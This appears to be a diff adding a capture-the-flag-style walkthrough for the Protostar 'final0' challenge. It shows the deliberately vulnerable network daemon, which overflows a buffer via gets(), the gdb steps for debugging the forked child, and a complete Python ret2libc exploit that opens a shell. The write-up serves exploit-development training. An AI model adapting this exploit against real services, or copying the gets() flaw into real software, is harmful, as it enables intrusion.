@@ -1801,3 +1801,125 @@ you have logged in already!
 
 ```
 
+## Final0 
+
+###Source Code:
+
+```c
+#include "../common/common.c"
+
+#define NAME "final0"
+#define UID 0
+#define GID 0
+#define PORT 2995
+
+/*
+ * Read the username in from the network
+ */
+
+char *get_username()
+{
+  char buffer[512];
+  char *q;
+  int i;
+
+  memset(buffer, 0, sizeof(buffer));
+  gets(buffer);
+
+  /* Strip off trailing new line characters */
+  q = strchr(buffer, '\n');
+  if(q) *q = 0;
+  q = strchr(buffer, '\r');
+  if(q) *q = 0;
+
+  /* Convert to lower case */
+  for(i = 0; i < strlen(buffer); i++) {
+      buffer[i] = toupper(buffer[i]);
+  }
+
+  /* Duplicate the string and return it */
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  username = get_username();
+  
+  printf("No such user %s\n", username);
+}
+```
+
+
+### Walkthrough:
+
+This challenge is a simple overflow, but this time, we need to debug a "remote" program. 
+So basically the trick to this, is we attach to the running process 
+
+```bash
+l$ sudo ps aux |grep final0  #sudo bc we had to start final0 as sudo
+root     21944  0.0  0.1   2060  1108 ?        Ss   14:19   0:00 /home/l/exploit-exercises/protostar/binaries/final0
+
+l@ip-172-31-61-60:~$ sudo gdb -p 21944
+Attaching to process 21944
+Reading symbols from /home/l/exploit-exercises/protostar/binaries/final0...done.
+Reading symbols from /lib32/libc.so.6...(no debugging symbols found)...done.
+Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
+0xf7fd8be9 in __kernel_vsyscall ()
+gdb$ 
+```
+Now, if we try to send some data with netcat or python, we'll run into some issues. GDB is attached to the parent process which is currently a systemcall that provides our socket. When data is sent to the port, it will spawn a child process of our target binary and we need to debug that. We need to set a few things in gdb to make this work!
+
+```bash
+set follow-fork-mode child  #when the program spawns a child process, GDB will follow that
+set detach-on-fork off      #stay attached to both processes when we fork
+```
+Now that we have set this up, we can use python to send some data and see useful data in gdb. I decided to just do a ret2libc rop for this challenge to get a shell. (if you need to know how this is done, check out [Stack6](#stack6) ;)
+Check out the python exploit below---
+
+### Python exploit:
+
+```python
+#! /usr/bin/python
+import socket
+import struct
+import telnetlib
+
+sys_loc = 0xf7e48940  #found with gdb print system
+bin_loc = 0xf7f66e8b  #found with find systemloc,+999999999, "/bin/sh"
+try:
+    print("[*]Connecting to target")
+    #create socket obj
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #connect the client
+    client.connect ( ('127.0.0.1',2995))
+
+    #payload
+    p =  'a'*532   #our offset 
+    p += struct.pack('<I', sys_loc)    
+    p += 'bbbb' #fake ebp
+    p += struct.pack('<I', bin_loc)
+    p += '\n'
+    print("[*]Sending Payload")
+    client.send(p)
+    print("enjoy your shell ;)")
+    #interact w shell
+    t = telnetlib.Telnet()
+    t.sock = client
+    t.interact()
+except socket.errno:
+    raise
+
+```
+
